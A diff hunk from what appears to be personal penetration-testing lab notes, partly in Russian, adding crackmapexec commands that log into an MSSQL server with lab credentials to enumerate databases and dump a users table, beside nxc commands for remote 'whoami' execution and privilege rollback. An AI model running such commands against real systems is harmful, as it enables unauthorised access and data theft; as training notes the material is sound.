@@ -268,6 +268,15 @@ export KRB5CCNAME=sqlsvc.ccache
             nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -x whoami
 
            (возвращение привелегий )nxc mssql 10.129.203.121 -u robert -p Inlanefreight01! -M mssql_priv -o ACTION=rollback
+
+        # SQL-запросы 
+
+            crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT name FROM master.dbo.sysdatabases" 
+
+            crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT table_name from core_app.INFORMATION_SCHEMA.TABLES" 
+
+            crackmapexec mssql 10.129.203.121 -u nicole -p Inlanefreight02! --local-auth -q "SELECT * from [core_app].[dbo].tbl_users"
+
             
                                                                             
 
